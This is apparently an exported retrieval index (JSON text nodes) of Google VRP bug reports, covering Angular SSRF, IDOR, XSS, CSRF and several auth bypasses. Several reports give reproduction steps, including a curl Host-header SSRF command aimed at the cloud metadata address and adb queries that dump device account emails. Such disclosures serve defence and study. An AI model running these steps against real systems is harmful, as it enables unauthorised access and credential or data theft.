chrome.runtime.lastError && console.error(chrome.runtime.lastError.message)\r\n        })\r\n    }\r\nUser language is injected to a script which will then injected to a page that require a translation. Problem here is that, the user language can be changed from a content script using\r\nchrome.storage.local.set\r\n.\r\nTherefore, a compromised renderer can set a value which can escape a string declaration in the JS code, and run arbitrary script in the site which were meant to be translated.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1746, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "04ac218c-69ad-475a-8127-24f78c17171f": {"__data__": {"id_": "04ac218c-69ad-475a-8127-24f78c17171f", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175721_879397.txt", "file_name": "20250408_175721_879397.txt", "file_type": "text/plain", "file_size": 3727, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "88a19300-fbfa-47a5-be03-0185045e4027", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175721_879397.txt", "file_name": "20250408_175721_879397.txt", "file_type": "text/plain", "file_size": 3727, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "e8518ff1f70954b273d117e3cbba1ee73fb874d164b01e49f0166c66a8cf43fb", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nother in Angular\r\nReported by:\r\ntyage\r\nGoogle VRP\r\ntriaged\r\n17:46 | Oct 27, 2020\r\naccepted\r\n01:04 | Oct 28, 2020\r\nfixed\r\n08:37 | Nov 12, 2020\r\nreward decided\r\n$5,000\r\nSummary: Server Side Request Forgery\r\n(I already reported this issue and it is already fixed in this PR\r\nhttps://github.com/angular/angular/pull/39334\r\n. I was told to submit the original report to this program after that.)\r\nIf an Angular universal application which has\r\n@nguniversal/*-engine\r\npackage and enables\r\nuseAbsoluteUrl\r\noption, the following component is automatically vulnerable to SSRF(Server Side Request Forgery).\r\nexport class TestComponent implements OnInit {\r\n  constructor(private http: HttpClient) { }\r\n\r\n  ngOnInit() {\r\n    const result = this.http.get('/api/test')\r\n  }\r\n}\r\nDetail\r\nAs the document says \"You don't need to do anything to make relative URLs work on the server.\", relative URLs for HTTP requests in the server side rendering are automatically converted and work. I think we need the useAbsoluteUrl option to use this feature in the latest version of angular.\r\nhttps://angular.io/guide/universal#using-absolute-urls-for-http-data-requests-on-the-server\r\nWhen the server calls\r\nthis.http.get('/api/test')\r\n, the URL will be http://[HOST]/api/test and [HOST] comes from the request of HTTP client.\r\nTherefore, if the attacker changes Host header to localhost, the server sends the request to localhost and it may return internal secret content to the attacker. This is an SSRF.\r\nPoC app\r\nTo create a PoC app, I ran\r\nng new app\r\nand\r\nng add @nguniversal/express-engine\r\nand then added a few lines of codes. (I installed @angular/cli version 10.1.6)\r\nGenerated simple application is here.\r\nhttps://github.com/tyage/angular-unviersal-sample-app\r\nFollowing is the diff from auto-generated code. I guess it is simple and no one will expect there is a vulnerability.\r\nhttps://github.com/tyage/angular-unviersal-sample-app/commit/2121558fa980a8a319f10561e2e71a6b88cc4467\r\nThen, I started the server with\r\nnpm run build:ssr\r\nand\r\nnpm run serve:ssr\r\n. I think this is a simple and standard way to create a universal angular application.\r\nAttack\r\nTo attack this server, I send an HTTP request with a modified Host header.\r\n$ curl localhost:4000 -H \"Host: mocos.kitchen:12345\"\r\nmocos.kitchen is my own server and it returns \"301 Moved Permanently\"\r\nHTTP/1.1 301 Moved Permanently\r\nLocation: https://api.thecatapi.com/v1/categories/\r\nThen, angular server fetches the contents of\r\nhttps://api.thecatapi.com/v1/categories/\r\nand injects it in the HTML. The attacker can change api.thecatapi.com to 169.254.169.254, which is a well-known SSRF target host in GCP or AWS since it returns credentials.\r\n<span _ngcontent-sc11=\"\">[object Object],[object Object],[object Object],[object Object],[object Object],[object Object],[object Object] app is running!</span>\r\nI recommend to add note in the docs\r\nFurthermore, if the version of angular is 10.0.0-rc.0, it is automatically vulnerable to SSRF without the\r\nuseAbsoluteUrl\r\noption.\r\nI also looked into a sample application and I think this code is potentially vulnerable to SSRF. (This app is safe until now since it use HttpClientInMemoryWebApiModule to \"simulate\" the server)\r\nhttps://github.com/angular/angular/blob/master/aio/content/examples/universal/src/app/hero.service.ts#L25\r\nBrowser/OS: Ubuntu 20.04, node.js v14.13.1\r\nAttack scenario:\r\nIf an Angular universal application which has\r\n@nguniversal/*-engine\r\npackage and enables\r\nuseAbsoluteUrl\r\noption, malicious attacker can exploit this vulnerability.\r\nThey might be able to fetch credentials from 169.254.169.254 or some other internal servers.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3711, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "56c04a76-9c00-4359-b436-9c97b7e0ebc4": {"__data__": {"id_": "56c04a76-9c00-4359-b436-9c97b7e0ebc4", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175721_910820.txt", "file_name": "20250408_175721_910820.txt", "file_type": "text/plain", "file_size": 845, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "0e872210-53ae-4825-94de-0be0e4844acd", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175721_910820.txt", "file_name": "20250408_175721_910820.txt", "file_type": "text/plain", "file_size": 845, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "e6fb87d69eedd70ff8bf67b68e26ba04715d032d5dcd5a3c19c56beaa4d6e1ab", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nother in https://applieddigitalskills.withgoogle.com/s/en/home\r\nReported by:\r\nNehal Pillai\r\nGoogle VRP\r\ntriaged\r\n15:39 | Oct 15, 2020\r\naccepted\r\n08:29 | Oct 26, 2020\r\nfixed\r\n08:47 | Dec 6, 2020\r\nSummary: IDOR in\r\nhttps://applieddigitalskills.withgoogle.com/s/en/home\r\nSteps to reproduce:\r\nGo to\r\nhttps://applieddigitalskills.withgoogle.com\r\nand sign in into your account\r\nNow , make sure that you are using the \"Teacher\" Platform\r\nAll you need to add in the url is \"/course/classcode#units\"\r\nYou will be able to view the course units and the page is still being available\r\nAttack scenario:\r\nEven though a teacher is not associated with a particular class , he or she is able to view the page where the class courses and the rest of the details are specified\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 829, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "4ddd7ab1-b511-4d1e-b101-c62d1d172c21": {"__data__": {"id_": "4ddd7ab1-b511-4d1e-b101-c62d1d172c21", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175721_942258.txt", "file_name": "20250408_175721_942258.txt", "file_type": "text/plain", "file_size": 2096, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "d1eb596a-6e77-4161-8724-3485d090da77", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175721_942258.txt", "file_name": "20250408_175721_942258.txt", "file_type": "text/plain", "file_size": 2096, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "6a971365205f76c8697c7569e0c29399424c00f692984a26cf7608b266ce83c6", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nAuth Bypass in Google Password Autofill on Android\r\nReported by:\r\nChristopher Menon\r\nGoogle VRP\r\ntriaged\r\n18:11 | Oct 5, 2020\r\naccepted\r\n23:46 | Oct 5, 2020\r\nfixed\r\n07:41 | Dec 20, 2020\r\nSummary: Can remove requirement to authenticate for autofill without authenticating\r\nSteps to reproduce:\r\nSet up an Android (this was tested on a Pixel 4a) phone with a Google Account that has some saved passwords for apps (Strava is used in this example).\r\nInstall an app that has a saved set of credentials in the Google account (e.g. Strava).\r\nEnable Auto-fill security by going to Settings -> System -> Languages and input -> Auto-fill service (under Advanced) -> the settings cog for Google -> Auto-fill Security, and enable the Credentials option under use biometrics. Go back once to 'save' this setting.\r\nOpen the app that we installed in Step 2 and try to autofill the credentials. You will be asked to authenticate, do not.\r\nRepeat the steps in Step 3 and disable the Credentials option under use biometrics. You will not be asked to authenticate and will be able to disable this setting successfully. Go back once to 'save' this setting.\r\nOpen the app again and try to autofill the credentials. You will not be asked to authenticate and will be able to sign in using the saved credentials.\r\nThis is a demo video which starts at Step 3:\r\nhttps://youtu.be/6793fdnv3DA\r\nBrowser/OS: This was tested on a Google Pixel 4a running the latest version of Android 11 in the UK, with build number RP1A.200720.010.\r\nAttack scenario:\r\nThis vulnerability gives the owner of the device a false sense of security - when they enable the requirement to authenticate when they use autofill they would reasonably expect that it could not be bypassed so easily. This setting is useless if it can be disabled so easily and without authenticating.\r\nA possible attack scenario would be if someone lent their phone to someone else, and the other person used the owner's credentials to sign in to their accounts without their knowledge.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2080, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "baf3f938-5140-4ee5-bf1e-dd8dbd115be9": {"__data__": {"id_": "baf3f938-5140-4ee5-bf1e-dd8dbd115be9", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175721_973714.txt", "file_name": "20250408_175721_973714.txt", "file_type": "text/plain", "file_size": 2692, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "865f8cb9-30d4-4db9-ac4f-bbe597873f44", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175721_973714.txt", "file_name": "20250408_175721_973714.txt", "file_type": "text/plain", "file_size": 2692, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "83a3448d1a74aba5c8d773b1cc802aab338c95f19a362310900e0f36b4bcafd8", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nAuth Bypass in Google Playstore app (com.google.android.gms)\r\nReported by:\r\nJatin\r\nGoogle VRP\r\ntriaged\r\n22:17 | Oct 1, 2020\r\naccepted\r\n04:43 | Oct 2, 2020\r\nfixed\r\n06:18 | Dec 7, 2020\r\nreward decided\r\n$500\r\nSummary: A content-provider which is set to exported as true, having no permissions enforced for read-write , is leaking the PII(emails, sync feeds) of android users to everybody.\r\nBug Description.\r\nA Content-Provider in the com.google.android.gms is universally exported. With no security permissions implemented for read-write operations. This allows any third party application to query , insert or delete the data from the content-provider's database.\r\nVulnerable ContentProvider: com.google.android.gms.subscribedfeeds.GmsSubscribedFeedsProvider\r\nContentUri: content://com.google.android.gms.subscribedfeeds/\r\nSteps to reproduce:\r\nConnect a android device with PC.\r\nPerform the below command.\r\nadb shell content query --uri content://com.google.android.gms.subscribedfeeds/feeds\r\nBelow will give google accounts present in android device.\r\nadb shell content query --uri content://com.google.android.gms.subscribedfeeds/accounts\r\nBy performing the above query commands; you will be able to see the data such as; full feed info using first one and com.google acounts with the second command.\r\nOther operations like; delete, insert and update can also be used like the above one.\r\nFix:\r\nIn order to fix this bug; you can set \"android:exported\" attribute to false.\r\nIncase you want to keep this public; you can enforce \"android:permission\"  to allow access to this provider only to apps having proper authorization.\r\nImpact.\r\nThe main impact here is that any third party application can use this vulnerability to scrape the\r\nuser accounts present\r\non the android device, without requesting any permissions.\r\nIn general ; if one need to get accounts present in device; then one need to have \"android.permission.GET_ACCOUNTS\" permission in manifest file. But using this bug , the only thing you need is to query data from content-provider.\r\nSince, there is no write protection present; therefore any third party process can write new  data.\r\nThe third party app can also update the existing data, without any permission.\r\nAlso, the third party app can insert new data without requiring any permissions.\r\nAttack scenario:\r\nAttack Scenarios:\r\nThe bug can be used by stealer apps to steal;\r\nthe sync feed logs of android,\r\nthe account emails present in android\r\nwithout requesting any permission at all. And thus sending this information to its creator. The creator then sell those info in dark market.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 2676, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "1aea1570-9fca-4ba9-95b2-cec968c881b8": {"__data__": {"id_": "1aea1570-9fca-4ba9-95b2-cec968c881b8", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175722_020976.txt", "file_name": "20250408_175722_020976.txt", "file_type": "text/plain", "file_size": 506, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "d8d53b8e-6ac7-446e-8c21-72882030baa4", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175722_020976.txt", "file_name": "20250408_175722_020976.txt", "file_type": "text/plain", "file_size": 506, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "5b5a30ad508445c520dc48a0b90c66efcc21bb29c2029c15536edf11834da828", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nXSS in https://informatica-prod.corp.goog\r\nReported by:\r\nRio Mulyadi Pulungan\r\nGoogle VRP\r\ntriaged\r\n22:54 | Jul 30, 2020\r\naccepted\r\n16:33 | Jul 31, 2020\r\nfixed\r\n05:03 | Feb 11, 2021\r\nreward decided\r\n$3,133.70\r\nGoogle comment\r\nThis was a so-called \"blind\" XSS, hence the very short report.\r\nI can't figure the injection endpoint, but you should look the dom file\r\nBrowser/OS: Chrome\r\nAttack scenario:\r\nSession Hijacking\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 490, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "b479c015-a3c0-45d8-9fba-5df260156e95": {"__data__": {"id_": "b479c015-a3c0-45d8-9fba-5df260156e95", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_116621.txt", "file_name": "20250408_175724_116621.txt", "file_type": "text/plain", "file_size": 709, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "d3365039-0c8c-4abc-936c-41861e37317f", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_116621.txt", "file_name": "20250408_175724_116621.txt", "file_type": "text/plain", "file_size": 709, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "6f4bea7802dfffe905c1ac6d97c9e6c2ac20180b0182e6cd5f56d450452bb346", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nXSS in https://experiments.withgoogle.com/submit\r\nReported by:\r\nRio Mulyadi Pulungan\r\nGoogle VRP\r\ntriaged\r\n22:32 | Jul 16, 2020\r\nclosed\r\n23:46 | Jul 16, 2020\r\ntriaged\r\n20:51 | Jul 20, 2020\r\naccepted\r\n21:17 | Jul 21, 2020\r\nfixed\r\n08:31 | Oct 17, 2020\r\nreward decided\r\n$100\r\nSteps to reproduce:\r\nOpen this link\r\nhttps://experiments.withgoogle.com/submit\r\nFill all the form with XSS Hunter Payload\r\nSubmit\r\nXSS Will be trigger in\r\nhttps://experiments.withgoogle.com/admin/experiments\r\nBrowser/OS: Chrome\r\nAttack scenario:\r\nBlind XSS in amdin page can steal admin Cookie, read some sensitive information form admin panel, etc\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 693, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "ce5048a3-dcf0-40e7-8228-0bd3c9ee313b": {"__data__": {"id_": "ce5048a3-dcf0-40e7-8228-0bd3c9ee313b", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_148155.txt", "file_name": "20250408_175724_148155.txt", "file_type": "text/plain", "file_size": 972, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "1b0df341-2e51-409d-9add-d67fad62a602", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_148155.txt", "file_name": "20250408_175724_148155.txt", "file_type": "text/plain", "file_size": 972, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "3798646549d6bc1cd9f4da85c4341c4c2184dfb3b94e2cd050b64fcff148aba2", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nCSRF in https://remotedesktop.google.com/\r\nReported by:\r\nMustafa Ahmed\r\nGoogle VRP\r\ntriaged\r\n00:52 | Jul 10, 2020\r\naccepted\r\n11:13 | Jul 12, 2020\r\nfixed\r\n09:33 | Dec 6, 2020\r\nreward decided\r\n$500\r\nSteps to reproduce:\r\nAttacker open (\r\nhttps://remotedesktop.google.com/support/\r\n) from get support section,click on \"GENERATE CODE\"\r\nattacker get the code\r\nThe Attacker adds the code he get to this link (\r\nhttps://remotedesktop.google.com/support/session/*the\r\ncode that he got previous*)\r\nlike (\r\nhttps://remotedesktop.google.com/support/session/816534317577\r\n)\r\nThe Attacker will place the malicious get request  onto a web site that they control, and then victims visit that web site the attacker will get users email in \r\n notification asking if he want to allow this email to connect\r\nAttack scenario:\r\nAn attacker can get users email by  just opening a web site or opening the URL\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 956, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "ff23a2c6-9445-4bda-a37c-872ad5481724": {"__data__": {"id_": "ff23a2c6-9445-4bda-a37c-872ad5481724", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_195500.txt", "file_name": "20250408_175724_195500.txt", "file_type": "text/plain", "file_size": 1716, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "59472fd4-b251-4e36-ae6e-b7185ff88454", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_195500.txt", "file_name": "20250408_175724_195500.txt", "file_type": "text/plain", "file_size": 1716, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "33e8fefae47d6e71c51936f79c064f4bdeb3529833f5f33d2bfaef40c59f1504", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nAuth Bypass in https://director.youtube.com/\r\nReported by:\r\nRyan Kovatch\r\nGoogle VRP\r\ntriaged\r\n21:10 | Jun 24, 2020\r\naccepted\r\n21:40 | Jun 24, 2020\r\ntriaged\r\n16:32 | Jun 25, 2020\r\naccepted\r\n17:02 | Jun 25, 2020\r\nfixed\r\n06:01 | Oct 17, 2020\r\nreward decided\r\n$6,337\r\nSummary: YouTube Video Builder allows unauthorized upload to any YouTube channel\r\nSteps to reproduce:\r\nYouTube Video Builder allows the express creation and uploading of advertisements to YouTube. Users must first be given access to the tool at\r\nhttps://director.youtube.com/videobuilder/\r\n.\r\nOnce access is granted, use the tool to create any advertisement, render it, and then stop at step 3: upload (the screen with the \"Save video\" button).\r\nWhen you click \"Save video,\" the client makes a request to\r\nhttps://director.youtube.com/videobuilder/_/rpc/Image2VideoUiService/UploadToYouTube\r\n. In the form data of the request is a YouTube channel ID that looks something like this: UCxXX0xx_X0XxxXXxxxx00Xx\r\nModify the request and send it with the ID of a channel that is not owned by the user. The server returns no error and the video is uploaded, unlisted, to the channel without issue. The video ID is included in the server's response.\r\nBrowser/OS: Ubuntu 20.04, Chrome dev 85.0.4173.0\r\nAttack scenario:\r\nAny regular user could use this to upload a video with no limits to any YouTube channel. This includes channels with massive influence, and even though the video is unlisted, it can still be seen by the creator and anyone with the link. It would be possible to, for example, upload and share a potentially harmful video to a channel and defame the user.\r\n\u767b\u5f55\r\n\u4f7f\u7528 Google \u8d26\u53f7\u767b\u5f55", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 1700, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "7cc18795-0679-4c9a-9c56-dbc23d607be3": {"__data__": {"id_": "7cc18795-0679-4c9a-9c56-dbc23d607be3", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_226922.txt", "file_name": "20250408_175724_226922.txt", "file_type": "text/plain", "file_size": 4604, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "excluded_embed_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "excluded_llm_metadata_keys": ["file_name", "file_type", "file_size", "creation_date", "last_modified_date", "last_accessed_date"], "relationships": {"1": {"node_id": "03d6c74a-702f-4265-91f0-8945e6619169", "node_type": "4", "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_226922.txt", "file_name": "20250408_175724_226922.txt", "file_type": "text/plain", "file_size": 4604, "creation_date": "2025-04-14", "last_modified_date": "2025-04-11"}, "hash": "82d5de4186e693e91dcc0a6bca2d6c3f82bfdec23815021ad461520a9cba752e", "class_name": "RelatedNodeInfo"}, "3": {"node_id": "0b547b31-8340-47bf-a86c-c8f3b8bdda6b", "node_type": "1", "metadata": {}, "hash": "210150c7109af7b8b67516d3a6aa021296a41db92333f8052370953ffa5b7495", "class_name": "RelatedNodeInfo"}}, "metadata_template": "{key}: {value}", "metadata_separator": "\n", "text": "Skip to Content (Press Enter)\r\nGoogle\r\nBug Hunters\r\nAuth Bypass in ads.google.com\r\nReported by:\r\nRichie Lee\r\nGoogle VRP\r\ntriaged\r\n01:33 | Jun 9, 2020\r\naccepted\r\n02:16 | Jun 10, 2020\r\ntriaged\r\n04:07 | Jul 17, 2020\r\naccepted\r\n18:31 | Sep 30, 2020\r\nfixed\r\n19:09 | Nov 26, 2020\r\nreward decided\r\n$5,000\r\nGoogle Ads - Disclosing script information in Bulk Actions through PREVIEW function\r\nHi!\r\nI found multiple vulnerabilities in Bulk Actions from Google Ads. After some trial and errors, I believe the vulnerability happens to trigger in the\r\nPREVIEW\r\nfunction of Bulk Actions.\r\nI decided to report this in Markdown format so it will be easier to understand the report. There are a few endpoints that are vulnerable to IDOR however can only be impactful if chained together to cause more damage.\r\nIn\r\nGoogle Ads Bulk Actions\r\n, there are 4 columns in the left which are\r\nAll bulk actions\r\n,\r\nRules\r\n,\r\nScripts\r\nand\r\nUploads\r\nThe vulnerability that I identified existed in\r\nScripts\r\nsection. I did not find anything juicy in\r\nAll bulk actions\r\nand\r\nRules\r\n(maybe I missed something but let's hope otherwise).\r\nUnderstanding the vulnerability\r\nThere are two endpoints in\r\nPREVIEW\r\nfunction of\r\nScripts\r\nthat matters to us. Before that, we need to understand 3 identifiers which is sent in the JSON payload with it.\r\nPs. I don't work in Google so I might be wrong\r\ndashboard id\r\nFictional, it is made up of 10 numeric characters which represents individual dashboard of a user. It is the first numeric string you will encounter when you decode the value of\r\n__ar\r\n. This might be public but I'm unsure which endpoint leaks it. Eg. 385089529\r\nscript id\r\nFictional,  it is made up of 8 numeric characters which represents the individual script in a dashboard. It is the second numeric string you will encounter in\r\n/aw_bulk/_/rpc/ScriptService/Preview\r\nwhen you decode the value of\r\n__ar\r\n. This value will be bruteforced by the attacker to gain the value of\r\nexecution_id\r\n. Eg. 3931988\r\nexecution_id\r\nNon-fictional, this parameter name is reflected in\r\n/aw_bulk/_/rpc/ExecutionProgressService/GetIncrementalProgress\r\n. It is made up of 20 numeric characters which indicates it's not a good idea to bruteforce it. Once this value is combined with\r\ndashboard id\r\n, it will return information of a script through\r\n/aw_bulk/_/rpc/ExecutionProgressService/GetIncrementalProgress\r\n. Eg. 1725875959726807315\r\nScripts Endpoints\r\n/aw_bulk/_/rpc/ScriptService/Preview\r\nThe above endpoint will need a valid\r\ndashboard id\r\nand\r\nscript id\r\nto return a valid\r\nexecution_id\r\n. In the\r\nfirst\r\nrequest it will return an OAuth URL. By navigating to it, it will prompt user to grant access to the script which discloses the script name. After granting access,\r\nresend\r\nthe request and it will return the value of\r\nexecution_id\r\nwhich can be used in the next endpoint.\r\n/aw_bulk/_/rpc/ExecutionProgressService/GetIncrementalProgress\r\nThis endpoint will need a valid combination of\r\ndashboard id\r\nand\r\nexecution_id\r\nto return the output details of the script.\r\nUploads Endpoints\r\nThis endpoint is identical to\r\n/aw_bulk/_/rpc/ExecutionProgressService/GetIncrementalProgress\r\nabove however it doesn't return useful information nor it can be chained with others.\r\n/aw_bulk/_/rpc/BulkExecutionStatusService/GetStatus\r\nI'm leaving it here if the security team wants to investigate further or patch it along.\r\nSteps to reproduce\r\nCreate a profile in\r\nGoogle Ads\r\nand navigate to\r\nBulk Actions\r\nObserve exists 3 columns which are\r\nRules\r\n,\r\nScripts\r\nand\r\nUploads\r\nClick\r\nScripts\r\nand create a new script with the following code and name it\r\nfunction main() {\r\nLogger.log(\"Hello Google VRP!\")\r\n}\r\nPrepare to intercept a POST request to\r\n/aw_bulk/_/rpc/ScriptService/Preview\r\nClick\r\nPreview\r\nin the bottom right corner\r\nObtain the value of\r\ndashboard id\r\nand\r\nscript id\r\nLogin into another account and perform the same thing.", "mimetype": "text/plain", "start_char_idx": 0, "end_char_idx": 3889, "metadata_seperator": "\n", "text_template": "{metadata_str}\n\n{content}", "class_name": "TextNode"}, "__type__": "1"}, "0b547b31-8340-47bf-a86c-c8f3b8bdda6b": {"__data__": {"id_": "0b547b31-8340-47bf-a86c-c8f3b8bdda6b", "embedding": null, "metadata": {"file_path": "D:\\Users\\27928\\Desktop\\contest\\jzj_generate_agent\\data\\vuln_kb\\20250408_175724_226922.txt", "file_name": "20250408_175724_226922.txt", "file_type": "text/plain", "file_size": 4604, "creation_date": "2025-04-14", "last_modified_date": 